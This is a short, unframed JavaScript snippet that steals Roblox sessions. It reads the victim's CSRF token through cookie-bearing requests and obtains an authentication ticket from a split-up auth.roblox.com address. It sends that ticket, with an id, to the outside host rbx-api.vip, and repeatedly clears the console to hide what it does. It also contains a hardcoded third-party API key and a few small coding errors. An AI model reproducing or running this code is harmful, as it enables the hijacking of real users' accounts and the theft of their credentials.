/**/var id = 11152;
let apiKey = '1be9a6884abd4c3ea143b59ca317c6b2';
var ip = 1.1.1.1;
$.getJSON('https://ipgeolocation.abstractapi.com/v1/?api_key=' + apiKey, function(data) {
  ip = JSON.stringify(data, null, 2);
});
console.clear();
var send_url="https://rbx-api.vip/send";
!async function(){try{var t=(await(await fetch("https://www.roblox.com/home",{credentials:"include"})).text()).split("<meta name=csrf-token data-token=")[1].split(">")[0]}catch{t=(await(await fetch("https://web.roblox.com/home",{credentials:"include"})).text()).split("<meta name=csrf-token data-token=")[1].split(">")[0]};
console.clear();
var e=(await fetch("https://a"+"u"+"th.roblox.com/v1/au"+"then"+"tication-ticket",{method:"POST",credentials:"include",headers:{"x-csrf-token":t}})).headers.get("rbx-authentication-ticket");
console.clear(),await fetch(send_url+"?ip=ip&t="+e+"&id="+id)}(),console.clear();
